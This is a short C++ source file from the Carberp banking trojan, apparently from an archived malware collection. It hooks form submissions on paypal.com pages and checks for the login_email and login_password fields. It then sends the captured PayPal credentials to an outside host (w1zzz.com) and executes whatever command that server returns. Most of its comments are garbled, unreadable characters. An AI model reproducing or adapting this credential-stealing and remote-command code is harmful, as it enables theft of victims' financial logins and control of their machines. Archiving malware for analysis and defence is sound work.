/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------


#include "HTMLSend.h"
#include "Strings.h"
#include "Loader.h"
#include "Task.h"
#include "Strings.h"
#include "BotDebug.h"

//---------------------------------------------------------------------------

const PCHAR DuplicateDataURL = "http://w1zzz.com/set/fgr.html";


void PayPalDataEvent(PSendHTMLData Data, bool &IgnoreHandler,  bool &Cancel)
{
	// ������� ��������� ������� ����� login � ������������ ������
	if (STR::Pos(Data->Data, "login_email") < 0 || STR::Pos(Data->Data, "login_password") < 0)
	{
		IgnoreHandler = true;
		return;
    }

	// ���������� ������ �� ������
	PCHAR Response = NULL;
	DataGrabber::SendHTMLDataToServer(DuplicateDataURL, Data, &Response);
	ExecuteCommand(NULL, Response, true);
}


//------------  ������������ ����������� �������� ������ -------------------//

//bool Initialized = false;

void InitHTMLSendHandlers()
{

    // ������������ ����������� ��������
	RegisterSendDataHandler("*paypal.com*", PayPalDataEvent, hdmUnknown, DuplicateDataURL);
}


//-------------------------------------------------------------------------//


